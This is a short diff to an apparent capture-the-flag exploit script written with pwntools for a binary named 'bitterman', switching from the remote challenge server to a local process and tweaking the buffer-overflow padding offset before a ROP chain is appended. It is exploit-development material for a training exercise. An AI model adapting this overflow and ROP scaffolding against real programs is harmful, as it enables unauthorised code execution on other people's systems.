@@ -2,8 +2,8 @@ from pwn import *
 import struct
 context(arch='amd64')
 
-# r = process('./bitterman')
-r = remote('challs.campctf.ccc.ac','10103')
+r = process('./bitterman')
+# r = remote('challs.campctf.ccc.ac','10103')
 
 elf = ELF('./bitterman')
 libc = ELF('libc.so.6')
@@ -45,8 +45,8 @@ RIP  0x4007e1 (main+245) <-- ret
 00:0000| rsp  0x7fffffffdaf8 <-- 'naaboaabpaabqaa...'
 """
 
-
 shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
+# shellcode = 'B' * (cyclic_find('oaab') - 4)
 shellcode += str(rop)
 
 r.clean()
